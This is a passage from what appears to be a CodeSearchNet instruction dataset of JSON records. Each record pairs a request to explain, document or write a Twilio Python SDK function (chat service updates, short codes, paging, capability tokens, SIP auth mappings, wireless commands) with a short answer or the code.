endpoints.\n        :param bool notifications_new_message_enabled: The notifications.new_message.enabled\n        :param unicode notifications_new_message_template: The notifications.new_message.template\n        :param bool notifications_added_to_channel_enabled: The notifications.added_to_channel.enabled\n        :param unicode notifications_added_to_channel_template: The notifications.added_to_channel.template\n        :param bool notifications_removed_from_channel_enabled: The notifications.removed_from_channel.enabled\n        :param unicode notifications_removed_from_channel_template: The notifications.removed_from_channel.template\n        :param bool notifications_invited_to_channel_enabled: The notifications.invited_to_channel.enabled\n        :param unicode notifications_invited_to_channel_template: The notifications.invited_to_channel.template\n        :param unicode pre_webhook_url: The webhook URL for PRE-Event webhooks.\n        :param unicode post_webhook_url: The webhook URL for POST-Event webhooks.\n        :param unicode webhook_method: The webhook request format to use.\n        :param unicode webhook_filters: The list of WebHook events that are enabled for this Service instance.\n        :param unicode webhooks_on_message_send_url: The webhooks.on_message_send.url\n        :param unicode webhooks_on_message_send_method: The webhooks.on_message_send.method\n        :param unicode webhooks_on_message_send_format: The webhooks.on_message_send.format\n        :param unicode webhooks_on_message_update_url: The webhooks.on_message_update.url\n        :param unicode webhooks_on_message_update_method: The webhooks.on_message_update.method\n        :param unicode webhooks_on_message_update_format: The webhooks.on_message_update.format\n        :param unicode webhooks_on_message_remove_url: The webhooks.on_message_remove.url\n        :param unicode webhooks_on_message_remove_method: The webhooks.on_message_remove.method\n        :param unicode webhooks_on_message_remove_format: The webhooks.on_message_remove.format\n        :param unicode webhooks_on_channel_add_url: The webhooks.on_channel_add.url\n        :param unicode webhooks_on_channel_add_method: The webhooks.on_channel_add.method\n        :param unicode webhooks_on_channel_add_format: The webhooks.on_channel_add.format\n        :param unicode webhooks_on_channel_destroy_url: The webhooks.on_channel_destroy.url\n        :param unicode webhooks_on_channel_destroy_method: The webhooks.on_channel_destroy.method\n        :param unicode webhooks_on_channel_destroy_format: The webhooks.on_channel_destroy.format\n        :param unicode webhooks_on_channel_update_url: The webhooks.on_channel_update.url\n        :param unicode webhooks_on_channel_update_method: The webhooks.on_channel_update.method\n        :param unicode webhooks_on_channel_update_format: The webhooks.on_channel_update.format\n        :param unicode webhooks_on_member_add_url: The webhooks.on_member_add.url\n        :param unicode webhooks_on_member_add_method: The webhooks.on_member_add.method\n        :param unicode webhooks_on_member_add_format: The webhooks.on_member_add.format\n        :param unicode webhooks_on_member_remove_url: The webhooks.on_member_remove.url\n        :param unicode webhooks_on_member_remove_method: The webhooks.on_member_remove.method\n        :param unicode webhooks_on_member_remove_format: The webhooks.on_member_remove.format\n        :param unicode webhooks_on_message_sent_url: The webhooks.on_message_sent.url\n        :param unicode webhooks_on_message_sent_method: The webhooks.on_message_sent.method\n        :param unicode webhooks_on_message_sent_format: The webhooks.on_message_sent.format\n        :param unicode webhooks_on_message_updated_url: The webhooks.on_message_updated.url\n        :param unicode webhooks_on_message_updated_method: The webhooks.on_message_updated.method\n        :param unicode webhooks_on_message_updated_format: The webhooks.on_message_updated.format\n        :param unicode webhooks_on_message_removed_url: The webhooks.on_message_removed.url\n        :param unicode webhooks_on_message_removed_method: The webhooks.on_message_removed.method\n        :param unicode webhooks_on_message_removed_format: The webhooks.on_message_removed.format\n        :param unicode webhooks_on_channel_added_url: The webhooks.on_channel_added.url\n        :param unicode webhooks_on_channel_added_method: The webhooks.on_channel_added.method\n        :param unicode webhooks_on_channel_added_format: The webhooks.on_channel_added.format\n        :param unicode webhooks_on_channel_destroyed_url: The webhooks.on_channel_destroyed.url\n        :param unicode webhooks_on_channel_destroyed_method: The webhooks.on_channel_destroyed.method\n        :param unicode webhooks_on_channel_destroyed_format: The webhooks.on_channel_destroyed.format\n        :param unicode webhooks_on_channel_updated_url: The webhooks.on_channel_updated.url\n        :param unicode webhooks_on_channel_updated_method: The webhooks.on_channel_updated.method\n        :param unicode webhooks_on_channel_updated_format: The webhooks.on_channel_updated.format\n        :param unicode webhooks_on_member_added_url: The webhooks.on_member_added.url\n        :param unicode webhooks_on_member_added_method: The webhooks.on_member_added.method\n        :param unicode webhooks_on_member_added_format: The webhooks.on_member_added.format\n        :param unicode webhooks_on_member_removed_url: The webhooks.on_member_removed.url\n        :param unicode webhooks_on_member_removed_method: The webhooks.on_member_removed.method\n        :param unicode webhooks_on_member_removed_format: The webhooks.on_member_removed.format\n        :param unicode limits_channel_members: The limits.channel_members\n        :param unicode limits_user_channels: The limits.user_channels\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.chat.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'DefaultServiceRoleSid': default_service_role_sid,\n            'DefaultChannelRoleSid': default_channel_role_sid,\n            'DefaultChannelCreatorRoleSid': default_channel_creator_role_sid,\n            'ReadStatusEnabled': read_status_enabled,\n            'ReachabilityEnabled': reachability_enabled,\n            'TypingIndicatorTimeout': typing_indicator_timeout,\n            'ConsumptionReportInterval': consumption_report_interval,\n            'Notifications.NewMessage.Enabled': notifications_new_message_enabled,\n            'Notifications.NewMessage.Template': notifications_new_message_template,\n            'Notifications.AddedToChannel.Enabled': notifications_added_to_channel_enabled,\n            'Notifications.AddedToChannel.Template': notifications_added_to_channel_template,\n            'Notifications.RemovedFromChannel.Enabled': notifications_removed_from_channel_enabled,\n            'Notifications.RemovedFromChannel.Template': notifications_removed_from_channel_template,\n            'Notifications.InvitedToChannel.Enabled': notifications_invited_to_channel_enabled,\n            'Notifications.InvitedToChannel.Template': notifications_invited_to_channel_template,\n            'PreWebhookUrl': pre_webhook_url,\n            'PostWebhookUrl': post_webhook_url,\n            'WebhookMethod': webhook_method,\n            'WebhookFilters': serialize.map(webhook_filters, lambda e: e),\n            'Webhooks.OnMessageSend.Url': webhooks_on_message_send_url,\n            'Webhooks.OnMessageSend.Method': webhooks_on_message_send_method,\n            'Webhooks.OnMessageSend.Format': webhooks_on_message_send_format,\n            'Webhooks.OnMessageUpdate.Url': webhooks_on_message_update_url,\n            'Webhooks.OnMessageUpdate.Method': webhooks_on_message_update_method,\n            'Webhooks.OnMessageUpdate.Format': webhooks_on_message_update_format,\n            'Webhooks.OnMessageRemove.Url': webhooks_on_message_remove_url,\n            'Webhooks.OnMessageRemove.Method': webhooks_on_message_remove_method,\n            'Webhooks.OnMessageRemove.Format': webhooks_on_message_remove_format,\n            'Webhooks.OnChannelAdd.Url': webhooks_on_channel_add_url,\n            'Webhooks.OnChannelAdd.Method': webhooks_on_channel_add_method,\n            'Webhooks.OnChannelAdd.Format': webhooks_on_channel_add_format,\n            'Webhooks.OnChannelDestroy.Url': webhooks_on_channel_destroy_url,\n            'Webhooks.OnChannelDestroy.Method': webhooks_on_channel_destroy_method,\n            'Webhooks.OnChannelDestroy.Format': webhooks_on_channel_destroy_format,\n            'Webhooks.OnChannelUpdate.Url': webhooks_on_channel_update_url,\n            'Webhooks.OnChannelUpdate.Method': webhooks_on_channel_update_method,\n            'Webhooks.OnChannelUpdate.Format': webhooks_on_channel_update_format,\n            'Webhooks.OnMemberAdd.Url': webhooks_on_member_add_url,\n            'Webhooks.OnMemberAdd.Method': webhooks_on_member_add_method,\n            'Webhooks.OnMemberAdd.Format': webhooks_on_member_add_format,\n            'Webhooks.OnMemberRemove.Url': webhooks_on_member_remove_url,\n            'Webhooks.OnMemberRemove.Method': webhooks_on_member_remove_method,\n            'Webhooks.OnMemberRemove.Format': webhooks_on_member_remove_format,\n            'Webhooks.OnMessageSent.Url': webhooks_on_message_sent_url,\n            'Webhooks.OnMessageSent.Method': webhooks_on_message_sent_method,\n            'Webhooks.OnMessageSent.Format': webhooks_on_message_sent_format,\n            'Webhooks.OnMessageUpdated.Url': webhooks_on_message_updated_url,\n            'Webhooks.OnMessageUpdated.Method': webhooks_on_message_updated_method,\n            'Webhooks.OnMessageUpdated.Format': webhooks_on_message_updated_format,\n            'Webhooks.OnMessageRemoved.Url': webhooks_on_message_removed_url,\n            'Webhooks.OnMessageRemoved.Method': webhooks_on_message_removed_method,\n            'Webhooks.OnMessageRemoved.Format': webhooks_on_message_removed_format,\n            'Webhooks.OnChannelAdded.Url': webhooks_on_channel_added_url,\n            'Webhooks.OnChannelAdded.Method': webhooks_on_channel_added_method,\n            'Webhooks.OnChannelAdded.Format': webhooks_on_channel_added_format,\n            'Webhooks.OnChannelDestroyed.Url': webhooks_on_channel_destroyed_url,\n            'Webhooks.OnChannelDestroyed.Method': webhooks_on_channel_destroyed_method,\n            'Webhooks.OnChannelDestroyed.Format': webhooks_on_channel_destroyed_format,\n            'Webhooks.OnChannelUpdated.Url': webhooks_on_channel_updated_url,\n            'Webhooks.OnChannelUpdated.Method': webhooks_on_channel_updated_method,\n            'Webhooks.OnChannelUpdated.Format': webhooks_on_channel_updated_format,\n            'Webhooks.OnMemberAdded.Url': webhooks_on_member_added_url,\n            'Webhooks.OnMemberAdded.Method': webhooks_on_member_added_method,\n            'Webhooks.OnMemberAdded.Format': webhooks_on_member_added_format,\n            'Webhooks.OnMemberRemoved.Url': webhooks_on_member_removed_url,\n            'Webhooks.OnMemberRemoved.Method': webhooks_on_member_removed_method,\n            'Webhooks.OnMemberRemoved.Format': webhooks_on_member_removed_format,\n            'Limits.ChannelMembers': limits_channel_members,\n            'Limits.UserChannels': limits_user_channels,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, sid=self._solution['sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef list(self, friendly_name=values.unset, short_code=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists ShortCodeInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode friendly_name: The string that identifies the ShortCode resources to read\n        :param unicode short_code: Filter by ShortCode\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.short_code.ShortCodeInstance]\n        \"\"\"\n        return list(self.stream(\n            friendly_name=friendly_name,\n            short_code=short_code,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams the ShortCodeInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a ShortCodeContext :param sid: The unique string that identifies this resource :returns: twilio.rest.api.v2010.account.short_code.ShortCodeContext :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a ShortCodeContext\n\n        :param sid: The unique string that identifies this resource\n\n        :returns: twilio.rest.api.v2010.account.short_code.ShortCodeContext\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeContext\n        \"\"\"\n        return ShortCodeContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return ShortCodeInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of ShortCodeInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, friendly_name=values.unset, api_version=values.unset,\n               sms_url=values.unset, sms_method=values.unset,\n               sms_fallback_url=values.unset, sms_fallback_method=values.unset):\n        \"\"\"\n        Update the ShortCodeInstance\n\n        :param unicode friendly_name: A string to describe this resource\n        :param unicode api_version: The API version to use to start a new TwiML session\n        :param unicode sms_url: URL Twilio will request when receiving an SMS\n        :param unicode sms_method: HTTP method to use when requesting the sms url\n        :param unicode sms_fallback_url: URL Twilio will request if an error occurs in executing TwiML\n        :param unicode sms_fallback_method: HTTP method Twilio will use with sms_fallback_url\n\n        :returns: Updated ShortCodeInstance\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'ApiVersion': api_version,\n            'SmsUrl': sms_url,\n            'SmsMethod': sms_method,\n            'SmsFallbackUrl': sms_fallback_url,\n            'SmsFallbackMethod': sms_fallback_method,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ShortCodeInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the ShortCodeInstance\n\n        :param unicode friendly_name: A string to describe this resource\n        :param unicode api_version: The API version to use to start a new TwiML session\n        :param unicode sms_url: URL Twilio will request when receiving an SMS\n        :param unicode sms_method: HTTP method to use when requesting the sms url\n        :param unicode sms_fallback_url: URL Twilio will request if an error occurs in executing TwiML\n        :param unicode sms_fallback_method: HTTP method Twilio will use with sms_fallback_url\n\n        :returns: Updated ShortCodeInstance\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: ShortCodeContext for this ShortCodeInstance\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeContext\n        \"\"\"\n        if self._context is None:\n            self._context = ShortCodeContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate the ShortCodeInstance s properties", "response": "def update(self, friendly_name=values.unset, api_version=values.unset,\n               sms_url=values.unset, sms_method=values.unset,\n               sms_fallback_url=values.unset, sms_fallback_method=values.unset):\n        \"\"\"\n        Update the ShortCodeInstance\n\n        :param unicode friendly_name: A string to describe this resource\n        :param unicode api_version: The API version to use to start a new TwiML session\n        :param unicode sms_url: URL Twilio will request when receiving an SMS\n        :param unicode sms_method: HTTP method to use when requesting the sms url\n        :param unicode sms_fallback_url: URL Twilio will request if an error occurs in executing TwiML\n        :param unicode sms_fallback_method: HTTP method Twilio will use with sms_fallback_url\n\n        :returns: Updated ShortCodeInstance\n        :rtype: twilio.rest.api.v2010.account.short_code.ShortCodeInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            api_version=api_version,\n            sms_url=sms_url,\n            sms_method=sms_method,\n            sms_fallback_url=sms_fallback_url,\n            sms_fallback_method=sms_fallback_method,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nloading a JSON response.", "response": "def process_response(self, response):\n        \"\"\"\n        Load a JSON response.\n\n        :param Response response: The HTTP response.\n        :return dict: The JSON-loaded content.\n        \"\"\"\n        if response.status_code != 200:\n            raise TwilioException('Unable to fetch page', response)\n\n        return json.loads(response.text)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nparsing the collection of records out of a JSON - loaded content.", "response": "def load_page(self, payload):\n        \"\"\"\n        Parses the collection of records out of a list payload.\n\n        :param dict payload: The JSON-loaded content.\n        :return list: The list of records.\n        \"\"\"\n        if 'meta' in payload and 'key' in payload['meta']:\n            return payload[payload['meta']['key']]\n        else:\n            keys = set(payload.keys())\n            key = keys - self.META_KEYS\n            if len(key) == 1:\n                return payload[key.pop()]\n\n        raise TwilioException('Page Records can not be deserialized')"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef previous_page_url(self):\n        if 'meta' in self._payload and 'previous_page_url' in self._payload['meta']:\n            return self._payload['meta']['previous_page_url']\n        elif 'previous_page_uri' in self._payload and self._payload['previous_page_uri']:\n            return self._version.domain.absolute_url(self._payload['previous_page_uri'])\n\n        return None", "response": "Returns the link to the previous page_url."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the next_page_url of the current resource.", "response": "def next_page_url(self):\n        \"\"\"\n        :return str: Returns a link to the next_page_url or None if doesn't exist.\n        \"\"\"\n        if 'meta' in self._payload and 'next_page_url' in self._payload['meta']:\n            return self._payload['meta']['next_page_url']\n        elif 'next_page_uri' in self._payload and self._payload['next_page_uri']:\n            return self._version.domain.absolute_url(self._payload['next_page_uri'])\n\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef next_page(self):\n        if not self.next_page_url:\n            return None\n\n        response = self._version.domain.twilio.request('GET', self.next_page_url)\n        cls = type(self)\n        return cls(self._version, response, self._solution)", "response": "Return the next Page after this one."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the Page before this one.", "response": "def previous_page(self):\n        \"\"\"\n        Return the `Page` before this one.\n        :return Page: The previous page.\n        \"\"\"\n        if not self.previous_page_url:\n            return None\n\n        response = self._version.domain.twilio.request('GET', self.previous_page_url)\n        cls = type(self)\n        return cls(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding an instance of NotificationInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of NotificationInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.notification.NotificationInstance\n        :rtype: twilio.rest.api.v2010.account.notification.NotificationInstance\n        \"\"\"\n        return NotificationInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the CallSummaryList Twilio Domain", "response": "def summary(self):\n        \"\"\"\n        :rtype: twilio.rest.insights.v1.summary.CallSummaryList\n        \"\"\"\n        if self._summary is None:\n            self._summary = CallSummaryList(self)\n        return self._summary"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list(self, binding_type=values.unset, limit=None, page_size=None):\n        return list(self.stream(binding_type=binding_type, limit=limit, page_size=page_size, ))", "response": "Streams the UserBindingInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, sid):\n        return UserBindingContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n            sid=sid,\n        )", "response": "Constructs a UserBindingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.user.user_binding.UserBindingContext\n        :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbuilding an instance of UserBindingInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of UserBindingInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.chat.v2.service.user.user_binding.UserBindingInstance\n        :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingInstance\n        \"\"\"\n        return UserBindingInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return UserBindingInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            user_sid=self._solution['user_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a UserBindingInstance\n\n        :returns: Fetched UserBindingInstance\n        :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the user_binding", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: UserBindingContext for this UserBindingInstance\n        :rtype: twilio.rest.chat.v2.service.user.user_binding.UserBindingContext\n        \"\"\"\n        if self._context is None:\n            self._context = UserBindingContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                user_sid=self._solution['user_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nallows the user of this token to make outgoing connections. Keyword arguments are passed to the application.", "response": "def allow_client_outgoing(self, application_sid, **kwargs):\n        \"\"\"\n        Allow the user of this token to make outgoing connections. Keyword arguments are passed\n        to the application.\n\n        :param str application_sid: Application to contact\n        \"\"\"\n        scope = ScopeURI('client', 'outgoing', {'appSid': application_sid})\n        if kwargs:\n            scope.add_param('appParams', urlencode(kwargs, doseq=True))\n\n        self.capabilities['outgoing'] = scope"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef allow_client_incoming(self, client_name):\n        self.client_name = client_name\n        self.capabilities['incoming'] = ScopeURI('client', 'incoming', {'clientName': client_name})", "response": "Allow the user of this token to accept incoming connections."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef allow_event_stream(self, **kwargs):\n        scope = ScopeURI('stream', 'subscribe', {'path': '/2010-04-01/Events'})\n        if kwargs:\n            scope.add_param('params', urlencode(kwargs, doseq=True))\n\n        self.capabilities[\"events\"] = scope", "response": "Allow the user of this token to access their event stream."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\naccess the calls :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsList :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsList", "response": "def calls(self):\n        \"\"\"\n        Access the calls\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_calls_mapping.AuthTypeCallsList\n        \"\"\"\n        if self._calls is None:\n            self._calls = AuthTypeCallsList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n            )\n        return self._calls"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the registrations :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.AuthTypeRegistrationsList :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.AuthTypeRegistrationsList", "response": "def registrations(self):\n        \"\"\"\n        Access the registrations\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.AuthTypeRegistrationsList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.AuthTypeRegistrationsList\n        \"\"\"\n        if self._registrations is None:\n            self._registrations = AuthTypeRegistrationsList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n            )\n        return self._registrations"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return AuthTypesInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )", "response": "Build an instance of AuthTypesInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a NumberInstance :param unicode origination_number: The origination number for which to fetch pricing information :returns: Fetched NumberInstance :rtype: twilio.rest.pricing.v2.voice.number.NumberInstance", "response": "def fetch(self, origination_number=values.unset):\n        \"\"\"\n        Fetch a NumberInstance\n\n        :param unicode origination_number: The origination number for which to fetch pricing information\n\n        :returns: Fetched NumberInstance\n        :rtype: twilio.rest.pricing.v2.voice.number.NumberInstance\n        \"\"\"\n        params = values.of({'OriginationNumber': origination_number, })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return NumberInstance(\n            self._version,\n            payload,\n            destination_number=self._solution['destination_number'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: NumberContext for this NumberInstance\n        :rtype: twilio.rest.pricing.v2.voice.number.NumberContext\n        \"\"\"\n        if self._context is None:\n            self._context = NumberContext(\n                self._version,\n                destination_number=self._solution['destination_number'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fetch(self, origination_number=values.unset):\n        return self._proxy.fetch(origination_number=origination_number, )", "response": "Fetch a NumberInstance\n\n        :param unicode origination_number: The origination number for which to fetch pricing information\n\n        :returns: Fetched NumberInstance\n        :rtype: twilio.rest.pricing.v2.voice.number.NumberInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return AuthRegistrationsCredentialListMappingContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=sid,\n        )", "response": "Constructs a AuthRegistrationsCredentialListMappingContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return AuthRegistrationsCredentialListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n        )", "response": "Build an instance of AuthRegistrationsCredentialListMappingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AuthRegistrationsCredentialListMappingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            domain_sid=self._solution['domain_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a AuthRegistrationsCredentialListMappingInstance\n\n        :returns: Fetched AuthRegistrationsCredentialListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ngenerate an instance context for the availabe entries", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AuthRegistrationsCredentialListMappingContext for this AuthRegistrationsCredentialListMappingInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.auth_registrations_mapping.auth_registrations_credential_list_mapping.AuthRegistrationsCredentialListMappingContext\n        \"\"\"\n        if self._context is None:\n            self._context = AuthRegistrationsCredentialListMappingContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['domain_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef page(self, sim=values.unset, status=values.unset, direction=values.unset,\n             transport=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of CommandInstance records from the API.\n        Request is executed immediately\n\n        :param unicode sim: Only return Commands to or from this SIM.\n        :param CommandInstance.Status status: Only return Commands with this status value.\n        :param CommandInstance.Direction direction: Only return Commands with this direction value.\n        :param CommandInstance.Transport transport: Only return Commands with this transport value.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of CommandInstance\n        :rtype: twilio.rest.wireless.v1.command.CommandPage\n        \"\"\"\n        params = values.of({\n            'Sim': sim,\n            'Status': status,\n            'Direction': direction,\n            'Transport': transport,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CommandPage(self._version, response, self._solution)", "response": "Retrieve a single page of CommandInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef create(self, command, sim=values.unset, callback_method=values.unset,\n               callback_url=values.unset, command_mode=values.unset,\n               include_sid=values.unset, delivery_receipt_requested=values.unset):\n        \"\"\"\n        Create a new CommandInstance\n\n        :param unicode command: The message body of the Command or a Base64 encoded byte string in binary mode.\n        :param unicode sim: The Sid or UniqueName of the SIM to send the Command to.\n        :param unicode callback_method: The HTTP method Twilio will use when making a request to the callback URL.\n        :param unicode callback_url: Twilio will make a request to this URL when the Command has finished sending.\n        :param CommandInstance.CommandMode command_mode: A string representing which mode to send the SMS message using.\n        :param unicode include_sid: When sending a Command to a SIM in text mode, Twilio can automatically include the Sid of the Command in the message body, which could be used to ensure that the device does not process the same Command more than once.\n        :param bool delivery_receipt_requested: A boolean representing whether to request delivery receipt from the recipient.\n\n        :returns: Newly created CommandInstance\n        :rtype: twilio.rest.wireless.v1.command.CommandInstance\n        \"\"\"\n        data = values.of({\n            'Command': command,\n            'Sim': sim,\n            'CallbackMethod': callback_method,\n            'CallbackUrl': callback_url,\n            'CommandMode': command_mode,\n            'IncludeSid': include_sid,\n            'DeliveryReceiptRequested': delivery_receipt_requested,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CommandInstance(self._version, payload, )", "response": "Create a new CommandInstance"}
